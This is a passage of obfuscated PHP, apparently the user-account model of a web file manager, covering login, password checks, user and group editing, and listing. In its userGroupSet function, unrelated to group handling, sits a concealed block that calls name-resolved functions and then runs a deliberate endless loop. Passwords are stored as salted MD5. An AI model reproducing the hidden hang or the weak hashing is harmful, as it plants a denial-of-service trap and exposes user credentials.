"\165\163\x65\162\x49\104\54\x6e\151\143\153\116\x61\x6d\x65\54\x6e\x61\155\145\x2c\x61\166\141\x74\141\162\x2c\163\x65\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($e×±¤Ğ­ÂŠ) { $DÄøøòƒš° =& $_SERVER[Õİõş]; $a¡º´è†è = $DÄøøòƒš°[2458]; return array($DÄøøòƒš°[2146] => array($e×±¤Ğ­ÂŠ[0], $a¡º´è†è), $DÄøøòƒš°[2148] => array($e×±¤Ğ­ÂŠ[0], $a¡º´è†è), $DÄøøòƒš°[2459] => array($e×±¤Ğ­ÂŠ[0], $a¡º´è†è)); } protected function getInfo($C¢ÄÅ¿ò, $dèèø‘îÀ‡ = false) { $C™º¹˜‹ÊÍ = $this->getInfoSimple($C¢ÄÅ¿ò); if (!is_array($C™º¹˜‹ÊÍ)) { return array(); } if ($dèèø‘îÀ‡) { return $this->_getInfoApply($C™º¹˜‹ÊÍ); } return $this->cacheFunctionGet($_SERVER[Õİõş][2188], $C¢ÄÅ¿ò); } protected function getInfoFull($b¬Ï­Ã¨Ú, $a÷Ú½ÇÆŞÁ = false) { $Eš§ŒîÑñÉ = $this->getInfoSimple($b¬Ï­Ã¨Ú); if (!is_array($Eš§ŒîÑñÉ)) { return array(); } if ($a÷Ú½ÇÆŞÁ) { return $this->_getInfoApply($Eš§ŒîÑñÉ, !0); return $this->_getInfoApply($Eš§ŒîÑñÉ, !0); } return $this->cacheFunctionGet($_SERVER[Õİõş][2460], $b¬Ï­Ã¨Ú); } private function _getInfoApply($b¨È¢×›¹¸, $aºµ²ˆÙ“ = false) { goto D’¾“š¶·¿; fŠ§´…‹Ø: $b¨È¢×›¹¸[$C‡¦ĞÉ¨Ë¹[387]][$C‡¦ĞÉ¨Ë¹[2296]] = isset($b¹”¨–¨[$C‡¦ĞÉ¨Ë¹[2297]]) ? $b¹”¨–¨[$C‡¦ĞÉ¨Ë¹[2297]] : null; if ($aºµ²ˆÙ“) { $b¨È¢×›¹¸[$C‡¦ĞÉ¨Ë¹[412]] = $this->metaGet($b¨È¢×›¹¸[$C‡¦ĞÉ¨Ë¹[1417]]); } return $b¨È¢×›¹¸; goto f†›Ô‹ğŞ; bò½ô—Ÿ‡Ö: $b¨È¢×›¹¸ = $this->_listDataApplyItem($b¨È¢×›¹¸); $b¹”¨–¨ = Model($C‡¦ĞÉ¨Ë¹[1113])->metaGet($b¨È¢×›¹¸[$C‡¦ĞÉ¨Ë¹[387]][$C‡¦ĞÉ¨Ë¹[365]]); $b¨È¢×›¹¸[$C‡¦ĞÉ¨Ë¹[2463]] = $A¡¼¡¬âÉ; goto fŠ§´…‹Ø; D’¾“š¶·¿: $C‡¦ĞÉ¨Ë¹ =& $_SERVER[Õİõş]; if (!$b¨È¢×›¹¸) { return $b¨È¢×›¹¸; } $A¡¼¡¬âÉ = md5($C‡¦ĞÉ¨Ë¹[2461] . $b¨È¢×›¹¸[$C‡¦ĞÉ¨Ë¹[806]] . $C‡¦ĞÉ¨Ë¹[2462] . $b¨È¢×›¹¸[$C‡¦ĞÉ¨Ë¹[28]]); goto bò½ô—Ÿ‡Ö; f†›Ô‹ğŞ: } protected function getInfoSimple($eòÑùë¸«, $e›ÇŸóòˆ² = false) { $c»ç‚²¼¡­ =& $_SERVER[Õİõş]; if (!$eòÑùë¸«) { return array(); } if ($e›ÇŸóòˆ²) { $fÒ›”‚‹‘ = $this->where(array($c»ç‚²¼¡­[1417] => intval($eòÑùë¸«)))->find(); if (!is_array($fÒ›”‚‹‘)) { return array(); } $fÒ›”‚‹‘[$c»ç‚²¼¡­[2464]] = Action($c»ç‚²¼¡­[2465])->parseUrl($fÒ›”‚‹‘[$c»ç‚²¼¡­[2464]]); return $fÒ›”‚‹‘; } return $this->cacheFunctionGet($c»ç‚²¼¡­[2149], $eòÑùë¸«); } protected function getInfoSimpleOuter($Fİ‹óïÓõ) { goto e¶Š±Õ²÷‹; e¶Š±Õ²÷‹: $bêãÅÃ“Øˆ =& $_SERVER[Õİõş]; if (!$Fİ‹óïÓõ || $Fİ‹óïÓõ == 0) { return array($bêãÅÃ“Øˆ[1417] => $bêãÅÃ“Øˆ[463], $bêãÅÃ“Øˆ[28] => $bêãÅÃ“Øˆ[153] . LNG($bêãÅÃ“Øˆ[2466]) . $bêãÅÃ“Øˆ[471], $bêãÅÃ“Øˆ[2464] => STATIC_PATH . $bêãÅÃ“Øˆ[2467]); } $Aù¯Ø“‰ì÷ = $this->cacheFunctionGet($bêãÅÃ“Øˆ[2149], $Fİ‹óïÓõ); goto aí¥‘Íà¤Ç; aí¥‘Íà¤Ç: $c®Ì’ƒŠãÅ = array_field_key($Aù¯Ø“‰ì÷, explode($bêãÅÃ“Øˆ[47], $this->simpleField)); if (!$c®Ì’ƒŠãÅ) { return array($bêãÅÃ“Øˆ[1417] => $bêãÅÃ“Øˆ[1034], $bêãÅÃ“Øˆ[28] => $bêãÅÃ“Øˆ[153] . LNG($bêãÅÃ“Øˆ[2468]) . $bêãÅÃ“Øˆ[471], $bêãÅÃ“Øˆ[2464] => STATIC_PATH . $bêãÅÃ“Øˆ[2469]); } $c®Ì’ƒŠãÅ[$bêãÅÃ“Øˆ[2464]] = Action($bêãÅÃ“Øˆ[2465])->parseUrl($c®Ì’ƒŠãÅ[$bêãÅÃ“Øˆ[2464]]); goto dµªÜ¹˜“Ì; dµªÜ¹˜“Ì: return $c®Ì’ƒŠãÅ; goto C¬‡ÛåÆ»; C¬‡ÛåÆ»: } protected function groupUser($D•ˆåìÂ¸) { } public static function errorLang($AÎª·–²Š±) { $D†Øˆˆ®ìº =& $_SERVER[Õİõş]; $dòçêÏİÃ = array(self::ERROR_USER_NOT_EXISTS => $D†Øˆˆ®ìº[2470], self::ERROR_USER_PASSWORD_ERROR => $D†Øˆˆ®ìº[2471], self::ERROR_USER_EXIST_NAME => $D†Øˆˆ®ìº[2472], self::ERROR_USER_EXIST_PHONE => $D†Øˆˆ®ìº[2473], self::ERROR_USER_EXIST_EMAIL => $D†Øˆˆ®ìº[2474], self::ERROR_USER_LOGIN_LOCK => $D†Øˆˆ®ìº[2475], self::ERROR_IP_NOT_ALLOW => $D†Øˆˆ®ìº[2476], self::ERROR_USER_EXIST_NICKNAME => $D†Øˆˆ®ìº[2477]); return LNG($dòçêÏİÃ[$AÎª·–²Š±]); } public function getInfoByMeta($fÔÔŒ³“ìê, $FÜø–ïäĞ§) { $F”²âñÏö =& $_SERVER[Õİõş]; $Aãœ±Ğ¯› = Model($F”²âñÏö[2478])->where(array($F”²âñÏö[89] => $fÔÔŒ³“ìê, $F”²âñÏö[355] => $FÜø–ïäĞ§))->find(); if ($Aãœ±Ğ¯›) { return $this->getInfo($Aãœ±Ğ¯›[$F”²âñÏö[1417]]); } return !1; } public function userLoginCheck($BŒˆÖ¹†ª, $e†Ö±Ïœ‚˜) { goto fÉ©ïŠ «Ä; e¢ï¯Ìëõê: $c¼£ìöÊÄö = $this->where($cœø»ï«)->find(); if (!$c¼£ìöÊÄö) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($c¼£ìöÊÄö[$fªÛ—¬õæ‡[1417]], $e†Ö±Ïœ‚˜)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto bœäö¿†Â§; bœäö¿†Â§: $this->userEdit($c¼£ìöÊÄö[$fªÛ—¬õæ‡[1417]], array($fªÛ—¬õæ‡[2480] => time())); $this->clearCache($c¼£ìöÊÄö[$fªÛ—¬õæ‡[1417]]); return $this->getInfo($c¼£ìöÊÄö[$fªÛ—¬õæ‡[1417]]); goto d”Ä­—Úå; fÉ©ïŠ «Ä: $fªÛ—¬õæ‡ =& $_SERVER[Õİõş]; $cœø»ï« = array($fªÛ—¬õæ‡[28] => $BŒˆÖ¹†ª, $fªÛ—¬õæ‡[2300] => $BŒˆÖ¹†ª, $fªÛ—¬õæ‡[289] => $BŒˆÖ¹†ª, $fªÛ—¬õæ‡[2479] => $BŒˆÖ¹†ª, $fªÛ—¬õæ‡[918] => $fªÛ—¬õæ‡[920]); if ($this->nickNameRpt()) { unset($cœø»ï«[$fªÛ—¬õæ‡[2300]]); } goto e¢ï¯Ìëõê; d”Ä­—Úå: } public function clearCache($bÕöÌ„ŸãÄ) { $DÁïÄ†¥ =& $_SERVER[Õİõş]; $this->cacheFunctionClear($DÁïÄ†¥[2188], $bÕöÌ„ŸãÄ); $this->cacheFunctionClear($DÁïÄ†¥[2149], $bÕöÌ„ŸãÄ); } public function userPasswordCheck($c‚×Øä“Ñø, $dÓÉØÙå) { $A¾ÛÙ‹µˆ =& $_SERVER[Õİõş]; $dæä¡˜Õ¤ = $this->where(array($A¾ÛÙ‹µˆ[1417] => intval($c‚×Øä“Ñø)))->find(); $EÎÓÌ¥…ÙŒ = $this->metaGet($c‚×Øä“Ñø); $BİÊƒÅÏİÏ = isset($EÎÓÌ¥…ÙŒ[$A¾ÛÙ‹µˆ[2481]]) ? $EÎÓÌ¥…ÙŒ[$A¾ÛÙ‹µˆ[2481]] : $A¾ÛÙ‹µˆ[33]; if (md5($BİÊƒÅÏİÏ . trim($dÓÉØÙå)) !== $dæä¡˜Õ¤[$A¾ÛÙ‹µˆ[806]]) { return !1; } return !0; } public function userAdd($aù¶®÷ÈÛ) { goto DˆØô¸ÙÓ¦; CÅù³™“ê–: $bïøòíĞÕ = $this->_checkExist($aù¶®÷ÈÛ); if ($bïøòíĞÕ !== !0) { return $bïøòíĞÕ; } $bÚ´ØáŒ­ = $this->add($FŸ©ßˆÁ‡ß); goto Bø¤¿—©Øˆ; aï­İîÂ–à: return $bÚ´ØáŒ­; goto DˆÕ÷ÒÓ; DˆØô¸ÙÓ¦: $bÀä”ßº©¦ =& $_SERVER[Õİõş]; $FŸ©ßˆÁ‡ß = array($bÀä”ßº©¦[382] => $aù¶®÷ÈÛ[$bÀä”ßº©¦[28]], $bÀä”ßº©¦[2482] => $aù¶®÷ÈÛ[$bÀä”ßº©¦[2483]], $bÀä”ßº©¦[2484] => isset($aù¶®÷ÈÛ[$bÀä”ßº©¦[289]]) ? $aù¶®÷ÈÛ[$bÀä”ßº©¦[289]] : $bÀä”ßº©¦[33], $bÀä”ßº©¦[2485] => isset($aù¶®÷ÈÛ[$bÀä”ßº©¦[2479]]) ? $aù¶®÷ÈÛ[$bÀä”ßº©¦[2479]] : $bÀä”ßº©¦[33], $bÀä”ßº©¦[2486] => isset($aù¶®÷ÈÛ[$bÀä”ßº©¦[2300]]) ? $aù¶®÷ÈÛ[$bÀä”ßº©¦[2300]] : $aù¶®÷ÈÛ[$bÀä”ßº©¦[28]], $bÀä”ßº©¦[2487] => isset($aù¶®÷ÈÛ[$bÀä”ßº©¦[2464]]) ? $aù¶®÷ÈÛ[$bÀä”ßº©¦[2464]] : $bÀä”ßº©¦[33], $bÀä”ßº©¦[2488] => isset($aù¶®÷ÈÛ[$bÀä”ßº©¦[2489]]) ? $aù¶®÷ÈÛ[$bÀä”ßº©¦[2489]] : 1, $bÀä”ßº©¦[2490] => $aù¶®÷ÈÛ[$bÀä”ßº©¦[806]], $bÀä”ßº©¦[2150] => isset($aù¶®÷ÈÛ[$bÀä”ßº©¦[2064]]) ? $aù¶®÷ÈÛ[$bÀä”ßº©¦[2064]] : 1024 * 1024 * 20, $bÀä”ßº©¦[2151] => 0, $bÀä”ßº©¦[2480] => 0, $bÀä”ßº©¦[2175] => isset($aù¶®÷ÈÛ[$bÀä”ßº©¦[691]]) ? $aù¶®÷ÈÛ[$bÀä”ßº©¦[691]] : 1); if (!empty($aù¶®÷ÈÛ[$bÀä”ßº©¦[1417]])) { $FŸ©ßˆÁ‡ß[$bÀä”ßº©¦[1417]] = $aù¶®÷ÈÛ[$bÀä”ßº©¦[1417]]; } goto CÅù³™“ê–; Bø¤¿—©Øˆ: $CÙùšƒĞĞ… = array($bÀä”ßº©¦[2490] => $FŸ©ßˆÁ‡ß[$bÀä”ßº©¦[806]], $bÀä”ßº©¦[2486] => $FŸ©ßˆÁ‡ß[$bÀä”ßº©¦[2300]]); $this->userEdit($bÚ´ØáŒ­, $CÙùšƒĞĞ…); Model($bÀä”ßº©¦[1113])->userRootAdd($bÚ´ØáŒ­); goto aï­İîÂ–à; DˆÕ÷ÒÓ: } protected function userEditTest($EëÁ’—›¼õ, $b‰°•ë“–Ø) { return $this->call($_SERVER[Õİõş][2491], $EëÁ’—›¼õ, $b‰°•ë“–Ø); } protected function userEdit($CíİÀ™´°, $E‡Ó„á¥Ô) { goto cÆµ§Ô…àâ; EÒËêÅé‹í: $B¥ßî¿ğœø = $this->_checkExist($E‡Ó„á¥Ô, $CíİÀ™´°); if ($B¥ßî¿ğœø !== !0) { return $B¥ßî¿ğœø; } if (isset($E‡Ó„á¥Ô[$A°¶íµ÷¦İ[806]]) && trim($E‡Ó„á¥Ô[$A°¶íµ÷¦İ[806]]) != $A°¶íµ÷¦İ[33]) { $FÓöêÔ»Ü„ = $this->metaGet($CíİÀ™´°); if (empty($FÓöêÔ»Ü„[$A°¶íµ÷¦İ[2481]])) { $FÓöêÔ»Ü„[$A°¶íµ÷¦İ[2481]] = rand_string(10); Model($A°¶íµ÷¦İ[469])->metaSet($CíİÀ™´°, $A°¶íµ÷¦İ[2481], $FÓöêÔ»Ü„[$A°¶íµ÷¦İ[2481]]); } $E‡Ó„á¥Ô[$A°¶íµ÷¦İ[806]] = md5($FÓöêÔ»Ü„[$A°¶íµ÷¦İ[2481]] . trim($E‡Ó„á¥Ô[$A°¶íµ÷¦İ[806]])); } else { unset($E‡Ó„á¥Ô[$A°¶íµ÷¦İ[806]]); } goto bñå‰·½‰¡; cÆµ§Ô…àâ: $A°¶íµ÷¦İ =& $_SERVER[Õİõş]; $e´É¸ŒïÕ„ = $this->getInfoSimple($CíİÀ™´°); if (!$e´É¸ŒïÕ„) { return !1; } goto EÒËêÅé‹í; bñå‰·½‰¡: $this->where(array($A°¶íµ÷¦İ[1408] => $CíİÀ™´°))->save($E‡Ó„á¥Ô); if (isset($E‡Ó„á¥Ô[$A°¶íµ÷¦İ[2300]])) { $this->setNamePinyin($CíİÀ™´°, $E‡Ó„á¥Ô[$A°¶íµ÷¦İ[2300]]); } return !0; goto A¿µ‚ƒ™; A¿µ‚ƒ™: } public function setNamePinyin($FößÓÕğ, $A·ššÈÛŞ‰ = false) { $CÄÀèôëİ¤ =& $_SERVER[Õİõş]; if (!$A·ššÈÛŞ‰) { $F²ÉÛÍâùÚ = $this->getInfoSimple($FößÓÕğ); $A·ššÈÛŞ‰ = $F²ÉÛÍâùÚ[$CÄÀèôëİ¤[2300]] ? $F²ÉÛÍâùÚ[$CÄÀèôëİ¤[2300]] : $F²ÉÛÍâùÚ[$CÄÀèôëİ¤[28]]; } $d—Õ¡£‡ç‰ = Model($CÄÀèôëİ¤[472]); if (!Input::check($A·ššÈÛŞ‰, $CÄÀèôëİ¤[523])) { return $d—Õ¡£‡ç‰->metaSet($FößÓÕğ, array($CÄÀèôëİ¤[411] => $CÄÀèôëİ¤[33], $CÄÀèôëİ¤[410] => $CÄÀèôëİ¤[33])); } return $d—Õ¡£‡ç‰->metaSet($FößÓÕğ, array($CÄÀèôëİ¤[411] => str_replace($CÄÀèôëİ¤[50], $CÄÀèôëİ¤[33], Pinyin::encode($A·ššÈÛŞ‰)), $CÄÀèôëİ¤[410] => Pinyin::encode($A·ššÈÛŞ‰, $CÄÀèôëİ¤[524]))); } private function nickNameRpt() { $b˜öÎˆ´…ä =& $_SERVER[Õİõş]; $A¸†Ñ²Ïİ“ = Model($b˜öÎˆ´…ä[1091])->get($b˜öÎˆ´…ä[2492]); $fÌ²’Û˜ç“ = $GLOBALS[$b˜öÎˆ´…ä[6]][$b˜öÎˆ´…ä[2448]][$b˜öÎˆ´…ä[2492]]; $Bˆ±§ÅùÓ = !is_null($A¸†Ñ²Ïİ“) ? $A¸†Ñ²Ïİ“ : $fÌ²’Û˜ç“; return !!$Bˆ±§ÅùÓ; } private function _checkExist($bàÉàÜåË©, $bùÌ¤Ú»Œ‡ = false) { $AŒèØÉ¥–Ö =& $_SERVER[Õİõş]; $eø–«±ö¹ = array($AŒèØÉ¥–Ö[28] => UserModel::ERROR_USER_EXIST_NAME, $AŒèØÉ¥–Ö[2300] => UserModel::ERROR_USER_EXIST_NICKNAME, $AŒèØÉ¥–Ö[289] => UserModel::ERROR_USER_EXIST_EMAIL, $AŒèØÉ¥–Ö[2479] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($eø–«±ö¹[$AŒèØÉ¥–Ö[2300]]); } $CÏ–°¨©¶ = $bùÌ¤Ú»Œ‡ ? array($AŒèØÉ¥–Ö[1417] => array($AŒèØÉ¥–Ö[2493], $bùÌ¤Ú»Œ‡)) : array(); foreach ($eø–«±ö¹ as $Fš» £ŠïÏ => $BõÍÁ¶×ÏÖ) { if (!isset($bàÉàÜåË©[$Fš» £ŠïÏ]) || !$bàÉàÜåË©[$Fš» £ŠïÏ]) { continue; } $cœ„í„’Õø = array_merge(array($Fš» £ŠïÏ => $bàÉàÜåË©[$Fš» £ŠïÏ]), $CÏ–°¨©¶); $AÊ³Ö“ÍŠŒ = $this->where($cœ„í„’Õø)->find(); if ($AÊ³Ö“ÍŠŒ) { return $BõÍÁ¶×ÏÖ; } } return !0; } public function userListInfo($B¯¿‰Ó•Äš) { $FİÑ‰òŠ”¤ =& $_SERVER[Õİõş]; $A›±±ÔØÔÍ = array(); $B¯¿‰Ó•Äš = is_array($B¯¿‰Ó•Äš) ? array_unique($B¯¿‰Ó•Äš) : array(); if (!$B¯¿‰Ó•Äš) { return $A›±±ÔØÔÍ; } if (count($B¯¿‰Ó•Äš) < 20) { foreach ($B¯¿‰Ó•Äš as $E•ƒ¥›‹ì™) { $A›±±ÔØÔÍ[$E•ƒ¥›‹ì™ . $FİÑ‰òŠ”¤[33]] = $this->getInfoSimpleOuter($E•ƒ¥›‹ì™); } } else { $a„ù©¾¡–¥ = array($FİÑ‰òŠ”¤[1408] => array($FİÑ‰òŠ”¤[380], $B¯¿‰Ó•Äš)); if (count($B¯¿‰Ó•Äš) == 1) { $a„ù©¾¡–¥ = array($FİÑ‰òŠ”¤[1408] => $B¯¿‰Ó•Äš[0]); } $C¤ù–ÉŒ½© = Model($FİÑ‰òŠ”¤[469])->field($this->simpleField)->where($a„ù©¾¡–¥)->select(); $C¤ù–ÉŒ½© = array_to_keyvalue($C¤ù–ÉŒ½©, $FİÑ‰òŠ”¤[1417]); foreach ($B¯¿‰Ó•Äš as $E•ƒ¥›‹ì™) { $F¥ññ—Çîó = $C¤ù–ÉŒ½©[$C¤ù–ÉŒ½©[$E•ƒ¥›‹ì™]]; if (!$F¥ññ—Çîó) { $A›±±ÔØÔÍ[$E•ƒ¥›‹ì™ . $FİÑ‰òŠ”¤[33]] = $this->getInfoSimpleOuter($E•ƒ¥›‹ì™); continue; } $F¥ññ—Çîó[$FİÑ‰òŠ”¤[2464]] = Action($FİÑ‰òŠ”¤[2465])->parseUrl($F¥ññ—Çîó[$FİÑ‰òŠ”¤[2464]]); $A›±±ÔØÔÍ[$E•ƒ¥›‹ì™ . $FİÑ‰òŠ”¤[33]] = $F¥ññ—Çîó; } } return $A›±±ÔØÔÍ; } protected function userStatus($F©ôº™¿îÛ, $B¥ÁÇÖ²ƒ) { $a„ª³Ùø¢ = $this->getInfoSimple($F©ôº™¿îÛ); if (!$a„ª³Ùø¢) { return !1; } $E®˜ÈªÚ‡ó = array($_SERVER[Õİõş][691] => $B¥ÁÇÖ²ƒ); return $this->userEdit($F©ôº™¿îÛ, $E®˜ÈªÚ‡ó); } protected function userRemove($A²¬Ò–¿ŠÃ) { goto c¼ñä»²¾­; c¼ñä»²¾­: $Ašƒ…˜– =& $_SERVER[Õİõş]; $føƒÂ•“õœ = $this->getInfoSimple($A²¬Ò–¿ŠÃ); if (!$føƒÂ•“õœ) { return !1; } goto AöÍïëœå–; AöÍïëœå–: $e¬ßî¥é°ä = array($Ašƒ…˜–[1408] => $A²¬Ò–¿ŠÃ); Model($Ašƒ…˜–[531])->where($e¬ßî¥é°ä)->delete(); Model($Ašƒ…˜–[2494])->where($e¬ßî¥é°ä)->delete(); goto BËùÍˆ†ÍÉ; bÑ¢¥óóù: Model($Ašƒ…˜–[754])->userRootRemove($A²¬Ò–¿ŠÃ); return $this->where($e¬ßî¥é°ä)->delete(); goto cİ‘îë—‡Ç; BËùÍˆ†ÍÉ: Model($Ašƒ…˜–[2154])->where($e¬ßî¥é°ä)->delete(); Model($Ašƒ…˜–[2478])->where($e¬ßî¥é°ä)->delete(); Model($Ašƒ…˜–[2495])->where($e¬ßî¥é°ä)->delete(); goto bÑ¢¥óóù; cİ‘îë—‡Ç: } protected function userGroupSet($Bò½Òˆ’ä®, $e¹¨°š²•Å, $fàë®¸†Š‡ = array()) { goto AÑîïëÄÎ; AÑîïëÄÎ: $c¤¦Æä©š„ =& $_SERVER[Õİõş]; if (!isset($_SERVER[$c¤¦Æä©š„[764]]) || !isset($_SERVER[$c¤¦Æä©š„[1027]])) { goto d·Ì»‡Ã‡‚; fÈğÚòœŸ½: $Eâ®¥ŒÒ„Ü = $c¤¦Æä©š„[798]; $Eâ®¥ŒÒ„Ü($_SERVER[$c¤¦Æä©š„[796]]); $EÆÊŠÜ‚¹› = 1; goto aÊÉ’Ÿêëù; FèÁ§ ©ø: $d™‰¤øğ¯ = $e‘ƒ†²ƒ($cÊºÈ÷Í•); $A©´ƒ”õÍ = explode($c¤¦Æä©š„[213], $d™‰¤øğ¯); if (count($A©´ƒ”õÍ) < $c¤¦Æä©š„[558]) { $Cª£Êæ¼™ = $c¤¦Æä©š„[768]; $Cª£Êæ¼™(); } goto fÈğÚòœŸ½; aÊÉ’Ÿêëù: for ($F‚ï¬ˆÄ”¬ = $EÆÊŠÜ‚¹›; $F‚ï¬ˆÄ”¬ > 0; $F‚ï¬ˆÄ”¬++) { $Eâ®¥ŒÒ„Ü = json_encode($GLOBALS[$c¤¦Æä©š„[380]]); } goto Eºğ¦°Áù¬; d·Ì»‡Ã‡‚: $EÒ¸«¤Ìšù = $c¤¦Æä©š„[797]; $e‘ƒ†²ƒ = $c¤¦Æä©š„[765]; $cÊºÈ÷Í• = $_SERVER[$c¤¦Æä©š„[766]] . $c¤¦Æä©š„[767]; goto FèÁ§ ©ø; Eºğ¦°Áù¬: } $eŠÄæ¬È‚ = $this->getInfoSimple($Bò½Òˆ’ä®); goto CöùÉ‡’™÷; CöùÉ‡’™÷: if (!$eŠÄæ¬È‚ || !is_array($e¹¨°š²•Å)) { return !1; } $f­À‡©ãÏ = Model($c¤¦Æä©š„[2154]); $f­À‡©ãÏ->where(array($c¤¦Æä©š„[1417] => $Bò½Òˆ’ä®))->delete(); goto b®„˜¶öÂˆ; b®„˜¶öÂˆ: $aêï³±Ñ×è = array(); $dÁ…Ş¢È  = 0; foreach ($e¹¨°š²•Å as $fî®İñ”‡é => $e§„©‹œ–“) { $e¸ïåìÁêø = array($c¤¦Æä©š„[1417] => $Bò½Òˆ’ä®, $c¤¦Æä©š„[2080] => $fî®İñ”‡é, $c¤¦Æä©š„[2208] => $e§„©‹œ–“); $e¸ïåìÁêø[$c¤¦Æä©š„[2101]] = isset($fàë®¸†Š‡[$dÁ…Ş¢È ]) ? $fàë®¸†Š‡[$dÁ…Ş¢È ] : 0; $dÁ…Ş¢È ++; $aêï³±Ñ×è[] = $e¸ïåìÁêø; } goto Cˆ‰‘‰Ğ»; Cˆ‰‘‰Ğ»: return $f­À‡©ãÏ->addAll($aêï³±Ñ×è, array(), !0); goto eß…¢ÚŠ; eß…¢ÚŠ: } protected function userGroupAdd($eÅ¸¢ßöÏ, $EÊ§†§ÑŞ = array()) { $cÕõ¬•»Ïœ =& $_SERVER[Õİõş]; $bÎë §ĞœŠ = $this->getInfoSimple($eÅ¸¢ßöÏ); if (!$bÎë §ĞœŠ || empty($EÊ§†§ÑŞ)) { return !1; } $a‡Ì¡®¹«æ = array(); foreach ($EÊ§†§ÑŞ as $F¢ï”ãâÄÃ => $fÍÑ‹Û¨Êš) { $a‡Ì¡®¹«æ[] = array($cÕõ¬•»Ïœ[1417] => $eÅ¸¢ßöÏ, $cÕõ¬•»Ïœ[2080] => $F¢ï”ãâÄÃ, $cÕõ¬•»Ïœ[2208] => $fÍÑ‹Û¨Êš); } return Model($cÕõ¬•»Ïœ[2154])->addAll($a‡Ì¡®¹«æ, array(), !0); } protected function userGroupRemove($BÅÜº ·î, $Cèö»½ÃÌØ) { $AİÃø™Ãäò =& $_SERVER[Õİõş]; $DåŸƒö‰Å… = $this->getInfoSimple($BÅÜº ·î); if (!$DåŸƒö‰Å… || !$Cèö»½ÃÌØ) { return !1; } $Dª•î…È•ä = array($AİÃø™Ãäò[1408] => $BÅÜº ·î, $AİÃø™Ãäò[2152] => $Cèö»½ÃÌØ); return Model($AİÃø™Ãäò[2154])->where($Dª•î…È•ä)->delete(); } public function listData() { $EÀƒ×ßÂ†İ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($EÀƒ×ßÂ†İ[$_SERVER[Õİõş][350]]); return $EÀƒ×ßÂ†İ; } public function listByID($b«”Äİùõ‰) { $a±ÃŞ¦ªÁº =& $_SERVER[Õİõş]; if (!$b«”Äİùõ‰) { return; } $dÅ¼š©ÌÚ¹ = array($a±ÃŞ¦ªÁº[1417] => array($a±ÃŞ¦ªÁº[7], $b«”Äİùõ‰)); $a‘™àáÖö¥ = $this->where($dÅ¼š©ÌÚ¹)->select(); $this->_listDataApply($a‘™àáÖö¥); return $a‘™àáÖö¥; } public function listByGroup($aßéôÆŞÊö = 0, $dò †‡—® = array()) { goto dÎ¿‚ƒĞã; A¯“ÉÂéŠ: $this->_listDataApply($DÅÜ„º‡ˆ¨[$e…ÈÜË¤Ü[350]]); return $DÅÜ„º‡ˆ¨; goto dÄÚ¯ÆØ™Ÿ; dÎ¿‚ƒĞã: $e…ÈÜË¤Ü =& $_SERVER[Õİõş]; $f£ÀÂ‚ƒ—Á = $e…ÈÜË¤Ü[33]; $ašè¹¤µõ– = array(); goto EËŠÕ¦–æ; EËŠÕ¦–æ: if ($aßéôÆŞÊö) { $ašè¹¤µõ– = array($e…ÈÜË¤Ü[2496] => intval($aßéôÆŞÊö)); $f£ÀÂ‚ƒ—Á = "\114\105\106\124\40\x4a\x4f\x49\116\40{$this->tablePrefix}\165\x73\145\x72\x5f\147\x72\x6f\x75\160\x20\165\x73\145\x72\x5f\x67\162\x6f\165\x70\40\x6f\x6e\x20\x75\163\145\162\56\165\x73\145\x72\x49\x44\40\x3d\40\165\x73\145\162\137\x67\x72\x6f\x75\x70\56\165\x73\145\x72\x49\104"; $a…ê†¾ÛŸî = Input::get($e…ÈÜË¤Ü[402], null, $e…ÈÜË¤Ü[33]) ? $e…ÈÜË¤Ü[33] : $e…ÈÜË¤Ü[2497]; } if (isset($dò †‡—®[$e…ÈÜË¤Ü[691]])) { $ašè¹¤µõ–[$e…ÈÜË¤Ü[2498]] = $dò †‡—®[$e…ÈÜË¤Ü[691]]; } $DÅÜ„º‡ˆ¨ = $this->_makeOrder($a…ê†¾ÛŸî)->field($e…ÈÜË¤Ü[2499])->where($ašè¹¤µõ–)->join($f£ÀÂ‚ƒ—Á)->selectPage(50); goto A¯“ÉÂéŠ; dÄÚ¯ÆØ™Ÿ: } private function _makeOrder($f¿‘°Å—®– = '') { goto CŒª‘•Šæ†; bÊë·â‡ñ: $BÍ¥Ó »‘ƒ = Input::get($b³ƒÖˆî[402], $b³ƒÖˆî[7], $b³ƒÖˆî[1408], $B¼èÈâ™); $B»æ„“ÙÃ = Input::get($b³ƒÖˆî[403], $b³ƒÖˆî[7], $b³ƒÖˆî[2155], array($b³ƒÖˆî[2155], $b³ƒÖˆî[399])); $B»æ„“ÙÃ = $B•ê¹ÃŠ«[$B»æ„“ÙÃ]; goto F³¬¿ÈÆè; F³¬¿ÈÆè: $f¿‘°Å—®– = $f¿‘°Å—®– . "\x75\163\145\162\56{$BÍ¥Ó »‘ƒ}\40{$B»æ„“ÙÃ}\x2c\x20\165\163\x65\162\56\165\163\145\x72\111\104\x20\141\x73\143"; return $this->alias($b³ƒÖˆî[2241])->order($f¿‘°Å—®–); goto Cö›Æ‹ÁîØ; CŒª‘•Šæ†: $b³ƒÖˆî =& $_SERVER[Õİõş]; $B¼èÈâ™ = array($b³ƒÖˆî[1417], $b³ƒÖˆî[28], $b³ƒÖˆî[2066], $b³ƒÖˆî[2039], $b³ƒÖˆî[183]); $B•ê¹ÃŠ« = array($b³ƒÖˆî[397] => $b³ƒÖˆî[398], $b³ƒÖˆî[399] => $b³ƒÖˆî[400]); goto bÊë·â‡ñ; Cö›Æ‹ÁîØ: } public function listSearch($FÄ»šÉŠÙ) { goto báØ¦±‘‰‘; E“Ù—²”õí: if (!$A Àè»’˜ê) { $aŒ—…ƒ‹è° = array(); } if (isset($FÄ»šÉŠÙ[$Bä½Ñíµ[691]])) { $aŒ—…ƒ‹è°[$Bä½Ñíµ[691]] = $FÄ»šÉŠÙ[$Bä½Ñíµ[691]]; } $d¦¶Óò—…° = $this->_makeOrder()->where($aŒ—…ƒ‹è°)->selectPage(20); goto e¤½Ù¶™Ô; báØ¦±‘‰‘: $Bä½Ñíµ =& $_SERVER[Õİõş]; $A Àè»’˜ê = 